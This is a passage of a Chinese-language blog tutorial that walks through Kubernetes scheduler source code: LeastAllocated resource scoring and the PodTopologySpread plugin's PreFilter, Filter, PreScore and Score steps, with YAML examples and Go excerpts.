pod.Spec.Overhead != nil { result.Add(pod.Spec.Overhead) } return result } // SetMaxResource 是比较ResourceList并为每个资源取最大值。 func (r *Resource) SetMaxResource(rl v1.ResourceList) { if r == nil { return } for rName, rQuantity := range rl { switch rName { case v1.ResourceMemory: r.Memory = max(r.Memory, rQuantity.Value()) case v1.ResourceCPU: r.MilliCPU = max(r.MilliCPU, rQuantity.MilliValue()) case v1.ResourceEphemeralStorage: if utilfeature.DefaultFeatureGate.Enabled(features.LocalStorageCapacityIsolation) { r.EphemeralStorage = max(r.EphemeralStorage, rQuantity.Value()) } default: if schedutil.IsScalarResourceName(rName) { r.SetScalar(rName, max(r.ScalarResources[rName], rQuantity.Value())) } } } } leastAllocate LeastAllocated 是 NodeResourcesFit 的打分策略 ，LeastAllocated 打分的标准是更偏向于请求资源较少的Node。将会先计算出Node上调度的pod请求的内存、CPU与其他资源的百分比，然后并根据请求的比例与容量的平均值的最小值进行优先级排序。\n计算公式是这样的：$\\frac{\\frac{cpu((capacity-requested) \\times MaxNodeScore \\times cpuWeight)}{capacity} + \\frac{memory((capacity-requested) \\times MaxNodeScore \\times memoryWeight}{capacity}) + \u0026hellip;}{weightSum}$\n下面来看下实现\nfunc leastResourceScorer(resToWeightMap resourceToWeightMap) func(resourceToValueMap, resourceToValueMap) int64 { return func(requested, allocable resourceToValueMap) int64 { var nodeScore, weightSum int64 for resource := range requested { weight := resToWeightMap[resource] // 计算出的资源分数乘weight resourceScore := leastRequestedScore(requested[resource], allocable[resource]) nodeScore += resourceScore * weight weightSum += weight } if weightSum == 0 { return 0 } // 最终除weightSum return nodeScore / weightSum } } leastRequestedScore 计算标准为未使用容量的计算范围为 0~MaxNodeScore，0 为最低优先级，MaxNodeScore 为最高优先级。未使用的资源越多，得分越高。\nfunc leastRequestedScore(requested, capacity int64) int64 { if capacity == 0 { return 0 } if requested \u0026gt; capacity { return 0 } // 容量 - 请求的 x 预期值（100）/ 容量 return ((capacity - requested) * int64(framework.MaxNodeScore)) / capacity } Topology [6] Concept 在对 podtopologyspread 插件进行分析前，先需要掌握Pod拓扑的概念。\nPod拓扑（Pod Topology）是Kubernetes Pod调度机制，可以将Pod分布在集群中不同 Zone ，以及用户自定义的各种拓扑域 （topology domains）。当有了拓扑域后，用户可以更高效的利用集群资源。\n如何来解释拓扑域，首先需要提及为什么需要拓扑域，在集群有3个节点，并且当Pod副本数为2时，又不希望两个Pod在同一个Node上运行。在随着扩大Pod的规模，副本数扩展到到15个时，这时候最理想的方式是每个Node运行5个Pod，在这种背景下，用户希望对集群中Zone的安排为相似的副本数量，并且在集群存在部分问题时可以更好的自愈（也是按照相似的副本数量均匀的分布在Node上）。在这种情况下Kubernetes 提供了Pod 拓扑约束来解决这个问题。\n定义一个Topology apiVersion: v1 kind: Pod metadata: name: example-pod spec: # Configure a topology spread constraint topologySpreadConstraints: - maxSkew: \u0026lt;integer\u0026gt; # minDomains: \u0026lt;integer\u0026gt; # optional; alpha since v1.24 topologyKey: \u0026lt;string\u0026gt; whenUnsatisfiable: \u0026lt;string\u0026gt; labelSelector: \u0026lt;object\u0026gt; 参数的描述：\nmaxSkew：Required，Pod分布不均的程度，并且数字必须大于零 当 whenUnsatisfiable: DoNotSchedule，则定义目标拓扑中匹配 pod 的数量与 全局最小值（拓扑域中的标签选择器匹配的 pod 的最小数量 ）maxSkew之间的最大允许差异。例如有 3 个 Zone，分别具有 2、4 和 5 个匹配的 pod，则全局最小值为 2 当 whenUnsatisfiable: ScheduleAnyway，scheduler 会为减少倾斜的拓扑提供更高的优先级。 minDomains：optional，符合条件的域的最小数量。 如果不指定该选项 minDomains，则约束的行为 minDomains: 1 。 minDomains必须大于 0。minDomains与 whenUnsatisfiable 一起时为whenUnsatisfiable: DoNotSchedule。 topologyKey：Node label的key，如果多个Node都使用了这个lable key那么 scheduler 将这些 Node 看作为相同的拓扑域。 whenUnsatisfiable：当 Pod 不满足分布的约束时，怎么去处理 DoNotSchedule（默认）不要调度。 ScheduleAnyway仍然调度它，同时优先考虑最小化倾斜节点 labelSelector：查找匹配的 Pod label选择器的node进行技术，以计算Pod如何分布在拓扑域中 对于拓扑域的理解 对于拓扑域，官方是这么说明的，假设有一个带有以下lable的 4 节点集群：\nNAME STATUS ROLES AGE VERSION LABELS node1 Ready \u0026lt;none\u0026gt; 4m26s v1.16.0 node=node1,zone=zoneA node2 Ready \u0026lt;none\u0026gt; 3m58s v1.16.0 node=node2,zone=zoneA node3 Ready \u0026lt;none\u0026gt; 3m17s v1.16.0 node=node3,zone=zoneB node4 Ready \u0026lt;none\u0026gt; 2m43s v1.16.0 node=node4,zone=zoneB 那么集群拓扑如图：\n图1：集群拓扑图 Source：https://kubernetes.io/docs/concepts/scheduling-eviction/topology-spread-constraints/ 假设一个 4 节点集群，其中 3个label被标记为foo: bar的 Pod 分别位于Node1、Node2 和 Node3：\n图2：集群拓扑图 Source：https://kubernetes.io/docs/concepts/scheduling-eviction/topology-spread-constraints/ 这种情况下，新部署一个Pod，并希望新Pod与现有Pod跨 Zone均匀分布，资源清单文件如下：\nkind: Pod apiVersion: v1 metadata: name: mypod labels: foo: bar spec: topologySpreadConstraints: - maxSkew: 1 topologyKey: zone whenUnsatisfiable: DoNotSchedule labelSelector: matchLabels: foo: bar containers: - name: pause image: k8s.gcr.io/pause:3.1 这个清单对于拓扑域来说，topologyKey: zone 表示对Pod均匀分布仅应用于已标记的节点（如 foo: bar），将会跳过没有标签的节点（如zone: \u0026lt;any value\u0026gt;）。如果 scheduler 找不到满足约束的方法，whenUnsatisfiable: DoNotSchedule 设置的策略则是 scheduler 对新部署的Pod保持 Pendding\n如果此时 scheduler 将新Pod 调度至 $Zone_A$，此时Pod分布在拓扑域间为 $[3,1]$ ，而 maxSkew 配置的值是1。此时倾斜值为 $Zone_A - Zone_B = 3-1=2$，不满足 maxSkew=1，故这个Pod只能被调度到 $Zone_B$。\n此时Pod调度拓扑图为图3或图4\n图3：集群拓扑图 Source：https://kubernetes.io/docs/concepts/scheduling-eviction/topology-spread-constraints/ 图4：集群拓扑图 Source：https://kubernetes.io/docs/concepts/scheduling-eviction/topology-spread-constraints/ 如果需要将Pod调度到 $Zone_A$ ,可以按照如下方式进行：\n修改 maxSkew=2 修改 topologyKey: node 而不是 Zone ，这种模式下可以将 Pod 均匀分布在Node而不是Zone之间。 修改 whenUnsatisfiable: DoNotSchedule 为 whenUnsatisfiable: ScheduleAnyway 确保新的Pod始终可被调度 下面再通过一个例子增强对拓扑域了解\n多拓扑约束\n设拥有一个 4 节点集群，其中 3 个现有 Pod 标记 foo: bar 分别位于 node1、node2 和 node3\n图5：集群拓扑图 Source：https://kubernetes.io/docs/concepts/scheduling-eviction/topology-spread-constraints/ 部署的资源清单如下：可以看出拓扑分布约束配置了多个\nkind: Pod apiVersion: v1 metadata: name: mypod labels: foo: bar spec: topologySpreadConstraints: - maxSkew: 1 topologyKey: zone whenUnsatisfiable: DoNotSchedule labelSelector: matchLabels: foo: bar - maxSkew: 1 topologyKey: node whenUnsatisfiable: DoNotSchedule labelSelector: matchLabels: foo: bar containers: - name: pause image: k8s.gcr.io/pause:3.1 在这种情况下，为了匹配第一个约束条件，新Pod 只能放置在 $Zone_B$ ；而就第二个约束条件，新Pod只能调度到 node4。在这种配置多约束条件下， scheduler 只考虑满足所有约束的值，因此唯一有效的是 node4。\n如何为集群设置一个默认拓扑域约束 默认情况下，拓扑域约束也作 scheduler 的为 scheduler configurtion 中的一部分参数，这也意味着，可以通过profile为整个集群级别指定一个默认的拓扑域调度约束，\napiVersion: kubescheduler.config.k8s.io/v1beta3 kind: KubeSchedulerConfiguration profiles: - schedulerName: default-scheduler pluginConfig: - name: PodTopologySpread args: defaultConstraints: - maxSkew: 1 topologyKey: topology.kubernetes.io/zone whenUnsatisfiable: ScheduleAnyway defaultingType: List 默认约束策略 如果在没有配置集群级别的约束策略时，kube-scheduler 内部 topologyspread 插件提供了一个默认的拓扑约束策略，大致上如下列清单所示\ndefaultConstraints: - maxSkew: 3 topologyKey: \u0026quot;kubernetes.io/hostname\u0026quot; whenUnsatisfiable: ScheduleAnyway - maxSkew: 5 topologyKey: \u0026quot;topology.kubernetes.io/zone\u0026quot; whenUnsatisfiable: ScheduleAnyway 上述清单中内容可以在 pkg\\scheduler\\framework\\plugins\\podtopologyspread\\plugin.go\nvar systemDefaultConstraints = []v1.TopologySpreadConstraint{ { TopologyKey: v1.LabelHostname, WhenUnsatisfiable: v1.ScheduleAnyway, MaxSkew: 3, }, { TopologyKey: v1.LabelTopologyZone, WhenUnsatisfiable: v1.ScheduleAnyway, MaxSkew: 5, }, } 可以通过在配置文件中留空，来禁用默认配置\ndefaultConstraints: [] defaultingType: List apiVersion: kubescheduler.config.k8s.io/v1beta3 kind: KubeSchedulerConfiguration profiles: - schedulerName: default-scheduler pluginConfig: - name: PodTopologySpread args: defaultConstraints: [] defaultingType: List 通过源码学习Topology podtopologyspread 实现了4种扩展点方法，包含 filter 和 score\nPreFilter 可以看到 PreFilter 的核心为 calPreFilterState\nfunc (pl *PodTopologySpread) PreFilter(ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod) (*framework.PreFilterResult, *framework.Status) { s, err := pl.calPreFilterState(ctx, pod) if err != nil { return nil, framework.AsStatus(err) } cycleState.Write(preFilterStateKey, s) return nil, nil } calPreFilterState 主要功能是用在计算如何在拓扑域中分布Pod，首先看段代码时，需要掌握下属几个概念\npreFilterState criticalPaths update func (pl *PodTopologySpread) calPreFilterState(ctx context.Context, pod *v1.Pod) (*preFilterState, error) { // 获取Node allNodes, err := pl.sharedLister.NodeInfos().List() if err != nil { return nil, fmt.Errorf(\u0026quot;listing NodeInfos: %w\u0026quot;, err) } var constraints []topologySpreadConstraint if len(pod.Spec.TopologySpreadConstraints) \u0026gt; 0 { // 这里会构建出TopologySpreadConstraints，因为约束是不确定的 constraints, err = filterTopologySpreadConstraints( pod.Spec.TopologySpreadConstraints, v1.DoNotSchedule, pl.enableMinDomainsInPodTopologySpread, pl.enableNodeInclusionPolicyInPodTopologySpread, ) if err != nil { return nil, fmt.Errorf(\u0026quot;obtaining pod's hard topology spread constraints: %w\u0026quot;, err) } } else { // buildDefaultConstraints使用\u0026quot;.DefaultConstraints\u0026quot;与pod匹配的 // service、replication controllers、replica sets // 和stateful sets的选择器为pod构建一个约束。 constraints, err = pl.buildDefaultConstraints(pod, v1.DoNotSchedule) if err != nil { return nil, fmt.Errorf(\u0026quot;setting default hard topology spread constraints: %w\u0026quot;, err) } } if len(constraints) == 0 { // 如果是空的，则返回空preFilterState return \u0026amp;preFilterState{}, nil } // 初始化一个 preFilterState 状态 s := preFilterState{ Constraints: constraints, TpKeyToCriticalPaths: make(map[string]*criticalPaths, len(constraints)), TpPairToMatchNum: make(map[topologyPair]int, sizeHeuristic(len(allNodes), constraints)), } // 根据node统计拓扑域数量 tpCountsByNode := make([]map[topologyPair]int, len(allNodes)) // 获取pod亲和度配置 requiredNodeAffinity := nodeaffinity.GetRequiredNodeAffinity(pod) processNode := func(i int) { nodeInfo := allNodes[i] node := nodeInfo.Node() if node == nil { klog.ErrorS(nil, \u0026quot;Node not found\u0026quot;) return } // 通过spreading去过滤node以用作filters，错误解析以向后兼容 if !pl.enableNodeInclusionPolicyInPodTopologySpread { if match, _ := requiredNodeAffinity.Match(node); !match { return } } // 确保node的lable 包含topologyKeys定义的值 if !nodeLabelsMatchSpreadConstraints(node.Labels, constraints) { return } tpCounts := make(map[topologyPair]int, len(constraints)) for _, c := range constraints { // 对应的约束列表 if pl.enableNodeInclusionPolicyInPodTopologySpread \u0026amp;\u0026amp; !c.matchNodeInclusionPolicies(pod, node, requiredNodeAffinity) { continue } // 构建出 topologyPair 以key value形式， // 通常情况下TopologyKey属于什么类型的拓扑 // node.Labels[c.TopologyKey] 则是属于这个拓扑中那个子域 pair := topologyPair{key: c.TopologyKey, value: node.Labels[c.TopologyKey]} // 计算与标签选择器相匹配的pod有多少个 count := countPodsMatchSelector(nodeInfo.Pods, c.Selector, pod.Namespace) tpCounts[pair] = count } tpCountsByNode[i] = tpCounts // 最终形成的拓扑结构 } // 执行上面的定义的processNode，执行的数量就是node的数量 pl.parallelizer.Until(ctx, len(allNodes), processNode) // 最后构建出 TpPairToMatchNum // 表示每个拓扑域中的每个子域各分布多少Pod，如图6所示 for _, tpCounts := range tpCountsByNode { for tp, count := range tpCounts { s.TpPairToMatchNum[tp] += count } } if pl.enableMinDomainsInPodTopologySpread { // 根据状态进行构建 preFilterState s.TpKeyToDomainsNum = make(map[string]int, len(constraints)) for tp := range s.TpPairToMatchNum { s.TpKeyToDomainsNum[tp.key]++ } } // 计算最小匹配出的拓扑对 for i := 0; i \u0026lt; len(constraints); i++ { key := constraints[i].TopologyKey s.TpKeyToCriticalPaths[key] = newCriticalPaths() } for pair, num := range s.TpPairToMatchNum { s.TpKeyToCriticalPaths[pair.key].update(pair.value, num) } return \u0026amp;s, nil // 返回的值则包含最小的分布 } preFilterState\n// preFilterState 是在PreFilter处计算并在Filter处使用。 // 它结合了 “TpKeyToCriticalPaths” 和 “TpPairToMatchNum” 来表示： //（1）在每个分布约束上匹配最少pod的criticalPaths。 // (2) 在每个分布约束上匹配的pod的数量。 // “nil preFilterState” 则表示没有设置（在PreFilter阶段）； // empty “preFilterState”对象则表示它是一个合法的状态，并在PreFilter阶段设置。 type preFilterState struct { Constraints []topologySpreadConstraint // 这里记录2条关键路径而不是所有关键路径。 // criticalPaths[0].MatchNum 始终保存最小匹配数。 // criticalPaths[1].MatchNum 总是大于或等于criticalPaths[0].MatchNum，但不能保证是第二个最小匹配数。 TpKeyToCriticalPaths map[string]*criticalPaths // TpKeyToDomainsNum 以 “topologyKey” 作为key ，并以zone的数量作为值。 TpKeyToDomainsNum map[string]int // TpPairToMatchNum 以 “topologyPair作为key” ，并以匹配到pod的数量作为value。 TpPairToMatchNum map[topologyPair]int } criticalPaths\n// [2]criticalPath能够工作的原因是基于当前抢占算法的实现，特别是以下两个事实 // 事实 1：只抢占同一节点上的Pod，而不是多个节点上的 Pod。 // 事实 2：每个节点在其抢占周期期间在“preFilterState”的单独副本上进行评估。如果我们计划转向更复杂的算法，例如“多个节点上的任意pod”时则需要重新考虑这种结构。 type criticalPaths [2]struct { // TopologyValue代表映射到拓扑键的拓扑值。 TopologyValue string // MatchNum代表匹配到的pod数量 MatchNum int } 单元测试中的测试案例，具有两个约束条件的场景，通过表格来解析如下：\nNode列表与标签如下表：\nNode Name 🏷️Lable-zone 🏷️Lable-node node-a zone1 node-a node-b zone1 node-b node-x zone2 node-x node-y zone2 node-y Pod列表与标签如下表：\nPod Name Node 🏷️Label p-a1 node-a foo: p-a2 node-a foo: p-b1 node-b foo: p-y1 node-y foo: p-y2 node-y foo: p-y3 node-y foo: p-y4 node-y foo: 对应的拓扑约束\nspec: topologySpreadConstraints: - MaxSkew: 1 TopologyKey: zone labelSelector: matchLabels: foo: bar MinDomains: 1 NodeAffinityPolicy: Honor NodeTaintsPolicy: Ignore - MaxSkew: 1 TopologyKey: node labelSelector: matchLabels: foo: bar MinDomains: 1 NodeAffinityPolicy: Honor NodeTaintsPolicy: Ignore 那么整个分布如下：\n图6：具有两个场景的分布图 实现的测试代码如下\n... { name: \u0026quot;normal case with two spreadConstraints\u0026quot;, pod: st.MakePod().Name(\u0026quot;p\u0026quot;).Label(\u0026quot;foo\u0026quot;, \u0026quot;\u0026quot;). SpreadConstraint(1, \u0026quot;zone\u0026quot;, v1.DoNotSchedule, fooSelector, nil, nil, nil). SpreadConstraint(1, \u0026quot;node\u0026quot;, v1.DoNotSchedule, fooSelector, nil, nil, nil). Obj(), nodes: []*v1.Node{ st.MakeNode().Name(\u0026quot;node-a\u0026quot;).Label(\u0026quot;zone\u0026quot;, \u0026quot;zone1\u0026quot;).Label(\u0026quot;node\u0026quot;, \u0026quot;node-a\u0026quot;).Obj(), st.MakeNode().Name(\u0026quot;node-b\u0026quot;).Label(\u0026quot;zone\u0026quot;, \u0026quot;zone1\u0026quot;).Label(\u0026quot;node\u0026quot;, \u0026quot;node-b\u0026quot;).Obj(), st.MakeNode().Name(\u0026quot;node-x\u0026quot;).Label(\u0026quot;zone\u0026quot;, \u0026quot;zone2\u0026quot;).Label(\u0026quot;node\u0026quot;, \u0026quot;node-x\u0026quot;).Obj(), st.MakeNode().Name(\u0026quot;node-y\u0026quot;).Label(\u0026quot;zone\u0026quot;, \u0026quot;zone2\u0026quot;).Label(\u0026quot;node\u0026quot;, \u0026quot;node-y\u0026quot;).Obj(), }, existingPods: []*v1.Pod{ st.MakePod().Name(\u0026quot;p-a1\u0026quot;).Node(\u0026quot;node-a\u0026quot;).Label(\u0026quot;foo\u0026quot;, \u0026quot;\u0026quot;).Obj(), st.MakePod().Name(\u0026quot;p-a2\u0026quot;).Node(\u0026quot;node-a\u0026quot;).Label(\u0026quot;foo\u0026quot;, \u0026quot;\u0026quot;).Obj(), st.MakePod().Name(\u0026quot;p-b1\u0026quot;).Node(\u0026quot;node-b\u0026quot;).Label(\u0026quot;foo\u0026quot;, \u0026quot;\u0026quot;).Obj(), st.MakePod().Name(\u0026quot;p-y1\u0026quot;).Node(\u0026quot;node-y\u0026quot;).Label(\u0026quot;foo\u0026quot;, \u0026quot;\u0026quot;).Obj(), st.MakePod().Name(\u0026quot;p-y2\u0026quot;).Node(\u0026quot;node-y\u0026quot;).Label(\u0026quot;foo\u0026quot;, \u0026quot;\u0026quot;).Obj(), st.MakePod().Name(\u0026quot;p-y3\u0026quot;).Node(\u0026quot;node-y\u0026quot;).Label(\u0026quot;foo\u0026quot;, \u0026quot;\u0026quot;).Obj(), st.MakePod().Name(\u0026quot;p-y4\u0026quot;).Node(\u0026quot;node-y\u0026quot;).Label(\u0026quot;foo\u0026quot;, \u0026quot;\u0026quot;).Obj(), }, want: \u0026amp;preFilterState{ Constraints: []topologySpreadConstraint{ { MaxSkew: 1, TopologyKey: \u0026quot;zone\u0026quot;, Selector: mustConvertLabelSelectorAsSelector(t, fooSelector), MinDomains: 1, NodeAffinityPolicy: v1.NodeInclusionPolicyHonor, NodeTaintsPolicy: v1.NodeInclusionPolicyIgnore, }, { MaxSkew: 1, TopologyKey: \u0026quot;node\u0026quot;, Selector: mustConvertLabelSelectorAsSelector(t, fooSelector), MinDomains: 1, NodeAffinityPolicy: v1.NodeInclusionPolicyHonor, NodeTaintsPolicy: v1.NodeInclusionPolicyIgnore, }, }, TpKeyToCriticalPaths: map[string]*criticalPaths{ \u0026quot;zone\u0026quot;: {{\u0026quot;zone1\u0026quot;, 3}, {\u0026quot;zone2\u0026quot;, 4}}, \u0026quot;node\u0026quot;: {{\u0026quot;node-x\u0026quot;, 0}, {\u0026quot;node-b\u0026quot;, 1}}, }, for pair, num := range s.TpPairToMatchNum { s.TpKeyToCriticalPaths[pair.key].update(pair.value, num) } TpPairToMatchNum: map[topologyPair]int{ {key: \u0026quot;zone\u0026quot;, value: \u0026quot;zone1\u0026quot;}: 3, {key: \u0026quot;zone\u0026quot;, value: \u0026quot;zone2\u0026quot;}: 4, {key: \u0026quot;node\u0026quot;, value: \u0026quot;node-a\u0026quot;}: 2, {key: \u0026quot;node\u0026quot;, value: \u0026quot;node-b\u0026quot;}: 1, {key: \u0026quot;node\u0026quot;, value: \u0026quot;node-x\u0026quot;}: 0, {key: \u0026quot;node\u0026quot;, value: \u0026quot;node-y\u0026quot;}: 4, }, }, } ... update\nupdate 函数实际上时用于计算 criticalPaths 中的第一位始终保持为是一个最小Pod匹配值\nfunc (p *criticalPaths) update(tpVal string, num int) { // first verify if `tpVal` exists or not i := -1 if tpVal == p[0].TopologyValue { i = 0 } else if tpVal == p[1].TopologyValue { i = 1 } if i \u0026gt;= 0 { // `tpVal` 表示已经存在 p[i].MatchNum = num if p[0].MatchNum \u0026gt; p[1].MatchNum { // swap paths[0] and paths[1] p[0], p[1] = p[1], p[0] } } else { // `tpVal` 表示不存在，如一个新初始化的值 // num对应子域分布的pod // 说明第一个元素不是最小的，则作为交换 if num \u0026lt; p[0].MatchNum { // update paths[1] with paths[0] p[1] = p[0] // update paths[0] p[0].TopologyValue, p[0].MatchNum = tpVal, num } else if num \u0026lt; p[1].MatchNum { // 如果小于 paths[1]，则更新它，永远保证元素0是最小，1是次小的 p[1].TopologyValue, p[1].MatchNum = tpVal, num } } } 综合来讲 Prefilter 主要做的工作是。循环所有的节点，先根据 NodeAffinity 或者 NodeSelector 进行过滤，然后根据约束中定义的 topologyKeys （拓扑划分的依据） 来选择节点。\n接下来会计算出每个拓扑域下的拓扑对（可以理解为子域）匹配的 Pod 数量，存入 TpPairToMatchNum 中，最后就是要把所有约束中匹配的 Pod 数量最小（第二小）匹配出来的路径（代码是这么定义的，理解上可以看作是分布图）放入 TpKeyToCriticalPaths 中保存起来。整个 preFilterState 保存下来传递到后续的 filter 插件中使用。\nFilter 在 preFilter 中 最后的计算结果会保存在 CycleState 中\ncycleState.Write(preFilterStateKey, s) Filter 主要是从 PreFilter 处理的过程中拿到状态 preFilterState，然后看下每个拓扑约束中的 MaxSkew 是否合法，具体的计算公式为：$matchNum + selfMatchNum - minMatchNum$\nmatchNum：Prefilter 中计算出的对应的拓扑分布数量，可以在Prefilter中参考对应的内容 if tpCount, ok := s.TpPairToMatchNum[pair]; ok { selfMatchNum：匹配到label的数量，匹配到则是1，否则为0 minMatchNum：获的 Prefilter 中计算出来的最小匹配的值 func (pl *PodTopologySpread) Filter(ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod, nodeInfo *framework.NodeInfo) *framework.Status { node := nodeInfo.Node() if node == nil { return framework.AsStatus(fmt.Errorf(\u0026quot;node not found\u0026quot;)) } // 拿到 prefilter处理的s，即preFilterState s, err := getPreFilterState(cycleState) if err != nil { return framework.AsStatus(err) } // 一个 空类型的 preFilterState是合法的，这种情况下将容忍每一个被调度的 Pod if len(s.Constraints) == 0 { return nil } podLabelSet := labels.Set(pod.Labels) // 设置标签 for _, c := range s.Constraints { // 因为拓扑约束允许多个所以 tpKey := c.TopologyKey tpVal, ok := node.Labels[c.TopologyKey] if !ok { klog.V(5).InfoS(\u0026quot;Node doesn't have required label\u0026quot;, \u0026quot;node\u0026quot;, klog.KObj(node), \u0026quot;label\u0026quot;, tpKey) return framework.NewStatus(framework.UnschedulableAndUnresolvable, ErrReasonNodeLabelNotMatch) } // 判断标准 // 现有的匹配数量 + 子匹配（1|0） - 全局minimum \u0026lt;= maxSkew minMatchNum, err := s.minMatchNum(tpKey, c.MinDomains, pl.enableMinDomainsInPodTopologySpread) if err != nil { klog.ErrorS(err, \u0026quot;Internal error occurred while retrieving value precalculated in PreFilter\u0026quot;, \u0026quot;topologyKey\u0026quot;, tpKey, \u0026quot;paths\u0026quot;, s.TpKeyToCriticalPaths) continue } selfMatchNum := 0 if c.Selector.Matches(podLabelSet) { selfMatchNum = 1 } pair := topologyPair{key: tpKey, value: tpVal} matchNum := 0 if tpCount, ok := s.TpPairToMatchNum[pair]; ok { matchNum = tpCount } skew := matchNum + selfMatchNum - minMatchNum if skew \u0026gt; int(c.MaxSkew) { klog.V(5).InfoS(\u0026quot;Node failed spreadConstraint: matchNum + selfMatchNum - minMatchNum \u0026gt; maxSkew\u0026quot;, \u0026quot;node\u0026quot;, klog.KObj(node), \u0026quot;topologyKey\u0026quot;, tpKey, \u0026quot;matchNum\u0026quot;, matchNum, \u0026quot;selfMatchNum\u0026quot;, selfMatchNum, \u0026quot;minMatchNum\u0026quot;, minMatchNum, \u0026quot;maxSkew\u0026quot;, c.MaxSkew) return framework.NewStatus(framework.Unschedulable, ErrReasonConstraintsNotMatch) } } return nil } minMatchNum\n// minMatchNum用于计算 倾斜的全局最小值，同时考虑 MinDomains。 func (s *preFilterState) minMatchNum(tpKey string, minDomains int32, enableMinDomainsInPodTopologySpread bool) (int, error) { paths, ok := s.TpKeyToCriticalPaths[tpKey] if !ok { return 0, fmt.Errorf(\u0026quot;failed to retrieve path by topology key\u0026quot;) } // 通常来说最小值是第一个 minMatchNum := paths[0].MatchNum if !enableMinDomainsInPodTopologySpread { // 就是plugin的配置的 enableMinDomainsInPodTopologySpread return minMatchNum, nil } domainsNum, ok := s.TpKeyToDomainsNum[tpKey] if !ok { return 0, fmt.Errorf(\u0026quot;failed to retrieve the number of domains by topology key\u0026quot;) } if domainsNum \u0026lt; int(minDomains) { // 当有匹配拓扑键的符合条件的域的数量小于 配置的\u0026quot;minDomains\u0026quot;(每个约束条件的这个配置) 时， //它将全局“minimum” 设置为0。 // 因为minimum默认就为1，如果他小于1，就让他为0 minMatchNum = 0 } return minMatchNum, nil } PreScore 与 Filter 类似， PreScore 也是类似 PreFilter 的构成。 initPreScoreState 来完成过滤。\n有了 PreFilter 基础后，对于 Score 来说大同小异\nfunc (pl *PodTopologySpread) PreScore( ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod, filteredNodes []*v1.Node, ) *framework.Status { allNodes, err := pl.sharedLister.NodeInfos().List() if err != nil { return framework.AsStatus(fmt.Errorf(\u0026quot;getting all nodes: %w\u0026quot;, err)) } if len(filteredNodes) == 0 || len(allNodes) == 0 { // No nodes to score. return nil } state := \u0026amp;preScoreState{ IgnoredNodes: sets.NewString(), TopologyPairToPodCounts: make(map[topologyPair]*int64), } // Only require that nodes have all the topology labels if using // non-system-default spreading rules. This allows nodes that don't have a // zone label to still have hostname spreading. // 如果使用非系统默认分布规则，则仅要求节点具有所有拓扑标签。 // 这将允许没有zone标签的节点仍然具有hostname分布。 requireAllTopologies := len(pod.Spec.TopologySpreadConstraints) \u0026gt; 0 || !pl.systemDefaulted err = pl.initPreScoreState(state, pod, filteredNodes, requireAllTopologies) if err != nil { return framework.AsStatus(fmt.Errorf(\u0026quot;calculating preScoreState: %w\u0026quot;, err)) } // return if incoming pod doesn't have soft topology spread Constraints. if len(state.Constraints) == 0 { cycleState.Write(preScoreStateKey, state) return nil } // Ignore parsing errors for backwards compatibility. requiredNodeAffinity := nodeaffinity.GetRequiredNodeAffinity(pod) processAllNode := func(i int) { nodeInfo := allNodes[i] node := nodeInfo.Node() if node == nil { return } if !pl.enableNodeInclusionPolicyInPodTopologySpread { // `node` should satisfy incoming pod's NodeSelector/NodeAffinity if match, _ := requiredNodeAffinity.Match(node); !match { return } } // All topologyKeys need to be present in `node` if requireAllTopologies \u0026amp;\u0026amp; !nodeLabelsMatchSpreadConstraints(node.Labels, state.Constraints) { return } for _, c := range state.Constraints { if pl.enableNodeInclusionPolicyInPodTopologySpread \u0026amp;\u0026amp; !c.matchNodeInclusionPolicies(pod, node, requiredNodeAffinity) { continue } pair := topologyPair{key: c.TopologyKey, value: node.Labels[c.TopologyKey]} // If current topology pair is not associated with any candidate node, // continue to avoid unnecessary calculation. // Per-node counts are also skipped, as they are done during Score. tpCount := state.TopologyPairToPodCounts[pair] if tpCount == nil { continue } count := countPodsMatchSelector(nodeInfo.Pods, c.Selector, pod.Namespace) atomic.AddInt64(tpCount, int64(count)) } } pl.parallelizer.Until(ctx, len(allNodes), processAllNode) // 保存状态给后面sorce调用 cycleState.Write(preScoreStateKey, state) return nil } 与Filter中Update使用的函数一样，这里也会到这一步，这里会构建出TopologySpreadConstraints，因为约束是不确定的\nfunc filterTopologySpreadConstraints(constraints []v1.TopologySpreadConstraint, action v1.UnsatisfiableConstraintAction, enableMinDomainsInPodTopologySpread, enableNodeInclusionPolicyInPodTopologySpread bool) ([]topologySpreadConstraint, error) { var result []topologySpreadConstraint for _, c := range constraints { if c.WhenUnsatisfiable == action { // 始终调度时 selector, err := metav1.LabelSelectorAsSelector(c.LabelSelector) if err != nil { return nil, err } tsc := topologySpreadConstraint{ MaxSkew: c.MaxSkew, TopologyKey: c.TopologyKey, Selector: selector, MinDomains: 1, // If MinDomains is nil, we treat MinDomains as 1. NodeAffinityPolicy: v1.NodeInclusionPolicyHonor, // If NodeAffinityPolicy is nil, we treat NodeAffinityPolicy as \u0026quot;Honor\u0026quot;. NodeTaintsPolicy: v1.NodeInclusionPolicyIgnore, // If NodeTaintsPolicy is nil, we treat NodeTaintsPolicy as \u0026quot;Ignore\u0026quot;. } if enableMinDomainsInPodTopologySpread \u0026amp;\u0026amp; c.MinDomains != nil { tsc.MinDomains = *c.MinDomains } if enableNodeInclusionPolicyInPodTopologySpread { if c.NodeAffinityPolicy != nil { tsc.NodeAffinityPolicy = *c.NodeAffinityPolicy } if c.NodeTaintsPolicy != nil { tsc.NodeTaintsPolicy = *c.NodeTaintsPolicy } } result = append(result, tsc) } } return result, nil } Score // 在分数扩展点调用分数。该函数返回的“score”是 `nodeName` 上匹配的 pod 数量，稍后会进行归一化。 func (pl *PodTopologySpread) Score(ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod, nodeName string) (int64, *framework.Status) { nodeInfo, err := pl.sharedLister.NodeInfos().Get(nodeName) if err != nil { return 0, framework.AsStatus(fmt.Errorf(\u0026quot;getting node %q from Snapshot: %w\u0026quot;, nodeName, err)) } node := nodeInfo.Node() s, err := getPreScoreState(cycleState) if err != nil { return 0, framework.AsStatus(err) } // Return if the node is not qualified. if s.IgnoredNodes.Has(node.Name) { return 0, nil } // 对于每个当前的 \u0026lt;pair\u0026gt;，当前节点获得 \u0026lt;matchSum\u0026gt; 的信用分。 // 计算 \u0026lt;matchSum\u0026gt;总和 并将其作为该节点的分数返回。 var score float64 for i, c := range s.Constraints { if tpVal, ok := node.Labels[c.TopologyKey]; ok { var cnt int64 if c.TopologyKey == v1.LabelHostname { cnt = int64(countPodsMatchSelector(nodeInfo.Pods, c.Selector, pod.Namespace)) } else { pair := topologyPair{key: c.TopologyKey, value: tpVal} cnt = *s.TopologyPairToPodCounts[pair] } score += scoreForCount(cnt, 